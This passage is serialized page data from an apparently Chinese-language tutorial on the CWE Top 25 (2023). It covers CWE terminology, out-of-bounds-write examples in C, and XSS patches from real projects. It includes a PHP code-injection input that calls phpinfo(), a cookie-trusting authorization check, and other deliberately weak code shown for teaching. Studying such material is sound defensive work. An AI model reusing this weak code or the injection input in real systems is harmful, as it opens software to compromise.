<span class="token string single-quoted-string">'name'</span><span class="token operator">=></span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*

...*/</span>
</span>42:Te03,<span class="token variable">$role</span> <span class="token operator">=</span> <span class="token variable">$_COOKIES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$role</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$role</span> <span class="token operator">=</span> <span class="token function">getRole</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$role</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token comment">// save the cookie to send out in future responses</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"role"</span><span class="token punctuation">,</span> <span class="token variable">$role</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token function">ShowLoginScreen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$role</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'Reader'</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">DisplayMedicalHistory</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'patient_ID'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"You are not Authorized to view this record\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
43:T40e,case 'sendtofriends':
    $postData = json_decode(file_get_contents('php://input'), true, 512, JSON_THROW_ON_ERROR);

    $author = trim((string) Filter::filterVar($postData['name'], FILTER_SANITIZE_SPECIAL_CHARS));
    $email = Filter::filterVar($postData['email'], FILTER_VALIDATE_EMAIL);
    $link = trim((string) Filter::filterVar($postData['link'], FILTER_VALIDATE_URL));
    $attached = trim((string) Filter::filterVar($postData['message'], FILTER_SANITIZE_SPECIAL_CHARS));
    $mailto = Filter::filterArray($postData['mailto[]']);

    $faqLanguage = trim((string) Filter::filterVar($postData['lang'], FILTER_SANITIZE_SPECIAL_CHARS));
    $faqId = trim((string) Filter::filterVar($postData['faqId'], FILTER_VALIDATE_INT));
    $categoryId = trim((string) Filter::filterVar($postData['categoryId'], FILTER_VALIDATE_INT));

    if (is_array($mailto) && count($mailto) > 5) {
        $response->setStatusCode(Response::HTTP_BAD_REQUEST);
        $response->setData(['error' => Translation::get('err_sendMail')]);
        break;
    }
44:T2456,<span class="token keyword">case</span> <span class="token string single-quoted-string">'sendtofriends'</span><span class="token punctuation">:</span>
    <span class="token variable">$postData</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">,</span> <span class="token constant">JSON_THROW_ON_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$author</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_SPECIAL_CHARS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'link'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$attached</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_SPECIAL_CHARS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mailto</span> <span class="token operator">=</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterArray</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mailto[]'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$faqLanguage</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_SPECIAL_CHARS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$faqId</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'faqId'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_INT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$categoryId</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token class-name static-context">Filter</span><span class="token operator">::</span><span class="token function">filterVar</span><span class="token punctuation">(</span><span class="token variable">$postData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'categoryId'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_INT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$mailto</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$mailto</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$response</span><span class="token operator">-></span><span class="token function">setStatusCode</span><span class="token punctuation">(</span><span class="token class-name static-context">Response</span><span class="token operator">::</span><span class="token constant">HTTP_BAD_REQUEST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$response</span><span class="token operator">-></span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token class-name static-context">Translation</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'err_sendMail'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
5:[["$","h2",null,{"className":"x-h1","children":["$","a",null,{"href":"https://cwe.mitre.org/index.html","target":"_blank","rel":"noreferrer","children":"关于CWE"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<span class=\"x-inline-strong\">通用缺陷枚举</span><code class=\"x-inline-highlight\">(Common Weakness Enumeration, CWE)</code>是针对硬件和软件弱点和漏洞的分类系统。该项目由美国国土安全部（DHS）网络安全和基础设施安全局（CISA）办公室赞助，由MITRE公司运营。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"相比于CVE记录描述产品中出现的漏洞，侧重于漏洞利用的技术影响，CWE对可能导致漏洞的常见缺陷或弱点进行分类，描述漏洞发生的根本原因。"}}],["$","h3",null,{"className":"x-h2","children":"术语"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"下面的内容译自<a href=\"https://cwe.mitre.org/documents/glossary/\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CWE Glossary</a>，这里只列出了几个下文可能出现的术语："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Behaviour</code>（行为）："}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"产品采取的操作，通常以代码实现或以算法表示。也可以指系统以外的其他参与者的操作。"}}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Resource</code>（资源）："}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"指在产品运行过程中被访问或修改的对象或实体，例如内存、CPU、文件或套接字。资源可以是系统级（内存或CPU）、代码级（函数或变量）或应用程序级（cookie或消息）。"}}]]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Property</code>（属性）："}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"指某个对系统预期的安全模型很重要的资源或行为，可能随时间变化。比如用户的输入最初是不受信任的，但经过系统的中和处理后，最终会被认为是受信任的。"}}]]}]]}],["$","h3",null,{"className":"x-h2","children":"CWE分类系统"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"CWE有一套树型的分类系统，CWE提供了一些组织各个条目的结构化描述，例如视图和分类。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"CWE Views是针对特定目的或特定受众而组织的弱点集合，大多数视图是整个CWE列表的子集。例如<a href=\"https://cwe.mitre.org/data/index.html\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CWE List</a>中给出的："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<a href=\"https://cwe.mitre.org/data/definitions/699.html\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">View by Software Development</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<a href=\"https://cwe.mitre.org/data/definitions/1194.html\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">View by Hardware Design</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<a href=\"https://cwe.mitre.org/data/definitions/1000.html\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">View by Research Concepts</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"CWE Categories是更细的划分，一个CWE分类可能包含一系列具有共同特征的CWE条目。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"CWE的不同条目也具有不同的抽象程度，有些条目描述了具体的缺陷，有些则描述了更一般的问题。CWE的条目之间也存在父级子级的关系。四种抽象程度如下图所示："}}],["$","$Ld",null,{"src":"weakness_abstractions.png","width":"600px","filterDarkTheme":true}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"这些分级在官网上也有对应的图标表示，相应的释义为："}}],["$","div",null,{"className":"x-table-wrapper","children":["$","table",null,{"className":"x-table","children":["$","tbody",null,{"children":[["$","tr","0",{"children":[["$","th","0",{"className":null,"width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"icon"}}]}],["$","th","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"释义"}}]}]]}],["$","tr","1",{"children":[["$","td","0",{"className":null,"width":null,"children":["$","$Ld",null,{"src":"view.png","width":"16px"}]}],["$","td","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">View</code>，视图。"}}]}]]}],["$","tr","2",{"children":[["$","td","0",{"className":null,"width":null,"children":["$","$Ld",null,{"src":"category.png","width":"16px"}]}],["$","td","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Category</code>，分类，一系列有共同特征的CWE条目。"}}]}]]}],["$","tr","3",{"children":[["$","td","0",{"className":null,"width":null,"children":["$","$Ld",null,{"src":"pillar.png","width":"16px"}]}],["$","td","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Pillar</code>，最抽象的CWE条目类型，但与<code class=\"x-inline-highlight\">Category</code>相比，仍然是从“技术上”对缺陷类型进行描述。"}}]}]]}],["$","tr","4",{"children":[["$","td","0",{"className":null,"width":null,"children":["$","$Ld",null,{"src":"class.png","width":"16px"}]}],["$","td","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Class</code>，较为抽象的CWE条目类型，通常独立于特定的语言或技术。<br/><code class=\"x-inline-highlight\">Class</code>级别的CWE通常从【行为、属性、资源】中的<code class=\"x-inline-highlight\">1</code>~<code class=\"x-inline-highlight\">2</code>个方面来描述问题。"}}]}]]}],["$","tr","5",{"children":[["$","td","0",{"className":null,"width":null,"children":["$","$Ld",null,{"src":"base.png","width":"16px"}]}],["$","td","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Base</code>，较为抽象的CWE条目类型，通常也是独立于资源或技术。<br/><code class=\"x-inline-highlight\">Base</code>级别的CWE通常从【行为、属性、技术、语言、资源】中的<code class=\"x-inline-highlight\">2</code>~<code class=\"x-inline-highlight\">3</code>个方面来描述问题。"}}]}]]}],["$","tr","6",{"children":[["$","td","0",{"className":null,"width":null,"children":["$","$Ld",null,{"src":"variant.png","width":"16px"}]}],["$","td","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Variant</code>，通常与特定种类的产品有关系，一般包含特定的语言或技术。<br/><code class=\"x-inline-highlight\">Variant</code>级别的CWE通常从【行为、属性、技术、语言、资源】中的<code class=\"x-inline-highlight\">3</code>~<code class=\"x-inline-highlight\">5</code>个方面来描述问题。"}}]}]]}],["$","tr","7",{"children":[["$","td","0",{"className":null,"width":null,"children":["$","$Ld",null,{"src":"composite.png","width":"16px"}]}],["$","td","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Composite</code>，此类缺陷需要多种缺陷同时存在，才会引发潜在的安全漏洞。数量较少。"}}]}]]}],["$","tr","8",{"children":[["$","td","0",{"className":null,"width":null,"children":["$","$Ld",null,{"src":"chain.png","width":"30px"}]}],["$","td","1",{"className":"x-cell-align-l","width":null,"children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Chain</code>，呈链式关系，例如缺陷X为缺陷Y的发生创造了条件。数量较少。<br/><code class=\"x-inline-highlight\">Chain</code>可以涉及两个以上的弱点，在某些情况下也可能具有树状结构。"}}]}]]}]]}]}]}],["$","h2",null,{"className":"x-h1","children":"View of CWE Top 25 (2023)"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"（2023年）前25个最危险的软件缺陷，按顺序排名。标题前的【<code class=\"x-inline-highlight\">P</code>/<code class=\"x-inline-highlight\">C</code>/<code class=\"x-inline-highlight\">B</code>/<code class=\"x-inline-highlight\">V</code>/<code class=\"x-inline-highlight\">Compo</code>】标识了其抽象类型。"}}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/787.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-787: Out-of-bounds Write"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"越界写入，在预期缓冲区末尾之后或开头之前写入。"}}],["$","h4",null,{"className":"x-h3","children":"Example 1"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"int id_sequence[3];\n\n/* Populate the id array. */\n\nid_sequence[0] = 123;\nid_sequence[1] = 234;\nid_sequence[2] = 345;\nid_sequence[3] = 456;\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$f"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"写入<code class=\"x-inline-highlight\">id_sequence[3]</code>越界了。"}}],["$","h4",null,{"className":"x-h3","children":"Example 2"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"int returnChunkSize(void *)\n{\n    /* if chunk info is valid, return the size of usable memory,\n    * else, return -1 to indicate an error.\n    */\n    ...\n}\nint main()\n{\n    ...\n    memcpy(destBuf, srcBuf, (returnChunkSize(destBuf) - 1));\n    ...\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$10"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">returnChunkSize()</code>遇到错误会返回<code class=\"x-inline-highlight\">-1</code>，但是<code class=\"x-inline-highlight\">memcpy()</code>假定传入的参数是<code class=\"x-inline-highlight\">unsigned</code>，此时负值会被转换成相当大的数值。"}}],["$","h4",null,{"className":"x-h3","children":"Example 3"}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"char *copy_input(char *user_supplied_string)\n{\n    int i, dst_index;\n    char *dst_buf = (char *)malloc(4 * sizeof(char) * MAX_SIZE);\n    if (MAX_SIZE <= strlen(user_supplied_string))\n    {\n        die(\"user string too long, die evil hacker!\");\n    }\n    dst_index = 0;\n    for (i = 0; i < strlen(user_supplied_string); i++)\n    {\n        if ('&' == user_supplied_string[i])\n        {\n            dst_buf[dst_index++] = '&';\n            dst_buf[dst_index++] = 'a';\n            dst_buf[dst_index++] = 'm';\n            dst_buf[dst_index++] = 'p';\n            dst_buf[dst_index++] = ';';\n        }\n        else if ('<' == user_supplied_string[i])\n        {\n            /* encode to &lt; */\n        }\n        else\n            dst_buf[dst_index++] = user_supplied_string[i];\n    }\n    return dst_buf;\n}\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$11"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"虽然前面做了长度检查，但是后续的逻辑将<code class=\"x-inline-highlight\">'&'</code>和<code class=\"x-inline-highlight\">'&#60;'</code>转为HTML实体时，可能导致长度增长。如果恶意构造包含大量<code class=\"x-inline-highlight\">'&'</code>的输入，可能导致越界写入。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2023-0841\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2023-0841</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://github.com/gpac/gpac/issues/2396\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/gpac/gpac/issues/2396</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/gpac/gpac/commit/851560e3dc8155d45ace4b0d77421f241ed71dc4\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/gpac/gpac/commit/851560e3dc8155d45ace4b0d77421f241ed71dc4</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"补丁：考虑<code class=\"x-inline-highlight\">bytes_skipped</code>。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"C"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"if (!ctx->in_seek) {\n    if (size > remain) {\n        GF_LOG(GF_LOG_WARNING, GF_LOG_MEDIA, (\"[MP3Dmx] truncated frame of size %u (remains %u)\\n\", size, remain));\n    if (bytes_skipped + size > remain) {\n        GF_LOG(GF_LOG_WARNING, GF_LOG_MEDIA, (\"[MP3Dmx] truncated frame of size %u (remains %d)\\n\", size, remain-bytes_skipped));\n        break;\n    }\n    dst_pck = gf_filter_pck_new_alloc(ctx->opid, size, &output);\n    if (!dst_pck) break;\n    memcpy(output, sync, size);\n    gf_filter_pck_set_cts(dst_pck, ctx->cts);\n    gf_filter_pck_set_duration(dst_pck, nb_samp);\n    gf_filter_pck_set_sap(dst_pck, GF_FILTER_SAP_1);\n    gf_filter_pck_set_framing(dst_pck, GF_TRUE, GF_TRUE);\n    if (ctx->byte_offset != GF_FILTER_NO_BO) {\n        gf_filter_pck_set_byte_offset(dst_pck, ctx->byte_offset + bytes_skipped);\n    }\n    gf_filter_pck_send(dst_pck);\n}\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 48px, var(--bg-transparent-red) 48px 96px, transparent 96px, transparent 96px, var(--bg-transparent-green) 96px 144px, transparent 144px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$12"}}]}]]}]]}],["$","h3",null,{"className":"x-h2","children":["$","a",null,{"href":"https://cwe.mitre.org/data/definitions/79.html","target":"_blank","rel":"noreferrer","children":"【B】CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"}]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"跨站脚本攻击。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-gray","children":["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"详见<a href=\"/24b/cross-site-scripting/\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">Learn XSS</a>。"}}]}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2014-8958\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2014-8958</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/phpmyadmin/phpmyadmin/commit/d32da348c4de2379482a48661ce968a55eebe5c4\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/phpmyadmin/phpmyadmin/commit/d32da348c4de2379482a48661ce968a55eebe5c4</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Patch</code>：<a href=\"https://github.com/phpmyadmin/phpmyadmin/commit/2ffdbf2d7daa0b92541d8b754e2afac555d3ed21\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://github.com/phpmyadmin/phpmyadmin/commit/2ffdbf2d7daa0b92541d8b754e2afac555d3ed21</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"部分补丁的内容：通过<code class=\"x-inline-highlight\">htmlspecialchars()</code>转义为HTML实体。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"PHP"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"$$html .= '<td>' . $type . '<bdo dir=\"ltr\"></bdo></td>';\n$html .= '<td>' . htmlspecialchars($type) . '<bdo dir=\"ltr\"></bdo></td>';\n"}]]}],["$","pre",null,{"style":{"background":"linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)"},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;td>'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$type</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;bdo dir=\"ltr\">&lt;/bdo>&lt;/td>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">'&lt;td>'</span> <span class=\"token operator\">.</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string 